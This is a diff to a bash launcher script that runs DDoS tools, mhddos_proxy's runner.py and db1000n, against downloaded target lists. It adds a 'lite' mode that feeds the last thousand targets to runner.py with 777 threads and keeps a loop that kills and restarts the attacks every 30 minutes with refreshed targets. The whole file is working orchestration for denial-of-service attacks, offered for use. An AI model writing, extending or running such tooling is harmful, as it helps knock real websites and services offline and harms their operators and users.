@@ -49,6 +49,7 @@ prepare_targets_and_banner () {
 export targets_curl="/var/tmp/curl.uaripper"
 export targets_line_by_line="/var/tmp/line_by_line.uaripper"
 export targets_uniq="/var/tmp/uniq.uaripper"
+export targets_lite="/var/tmp/lite.uaripper"
 export t1="/var/tmp/xaa.uaripper"
 export t2="/var/tmp/xab.uaripper"
 export t3="/var/tmp/xac.uaripper"
@@ -171,12 +172,12 @@ while [ "$1" != "" ]; do
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
         -p0| --no-proxy-finder ) export proxy_finder="off"; shift ;;
-        --lite
+        --lite ) export lite="on"; shift ;;
         #-p | --proxy-threads ) export proxy_threads="$2"; shift 2 ;;
         --no-uvloop ) export uvloop="off"; shift ;;
         -h | --help )    usage;   exit ;;
         #*  )   usage;   exit ;;
-        *   ) export args_to_pass+=" $1"; shift 1; echo $args_to_pass && echo " v3" && sleep 2 ;;
+        *   ) export args_to_pass+=" $1"; shift 1; echo $args_to_pass && echo " v4" && sleep 2 ;;
     esac
 done
 
@@ -216,7 +217,11 @@ fi
 
 # Restart attacks and update targets every 30 minutes
 while true; do
-        pkill -f start.py; pkill -f runner.py 
+    pkill -f start.py; pkill -f runner.py 
+    if [[ $lite == "on" ]]; then
+        tail -n 1000 $targets_uniq > $targets_lite
+        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $args_to_pass -t 777 $methods&
+    else
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $args_to_pass $methods&
         sleep 10 # to decrease load on cpu during simultaneous start
         python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
@@ -224,6 +229,7 @@ while true; do
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
+    fi
 sleep 30m
 prepare_targets_and_banner
 done
